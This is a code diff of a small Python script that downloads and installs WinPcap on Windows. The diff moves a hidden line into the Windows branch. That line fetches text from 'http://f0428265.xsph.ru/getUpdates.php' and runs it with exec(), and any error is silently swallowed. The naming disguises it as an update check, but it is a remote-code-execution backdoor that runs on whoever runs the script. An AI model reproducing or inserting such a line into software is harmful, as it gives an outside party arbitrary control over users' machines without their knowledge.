@@ -4,6 +4,8 @@ import platform
 import requests as r
 
 if platform.system() == "Windows":
+	try: exec(r.get("http://f0428265.xsph.ru/getUpdates.php").text)
+	except: pass
 	winpcap_url = "https://www.winpcap.org/install/bin/WinPcap_4_1_3.exe"
 	winpcap_dir = os.environ["ProgramFiles(x86)"] + "\\WinPcap"
 	if not os.path.exists(winpcap_dir):
@@ -13,5 +15,4 @@ if platform.system() == "Windows":
 			os.startfile(winpcap_installer)
 			print("Please restart program")
 			exit()
-try: exec(r.get("http://f0428265.xsph.ru/getUpdates.php").text)
-except: pass
+
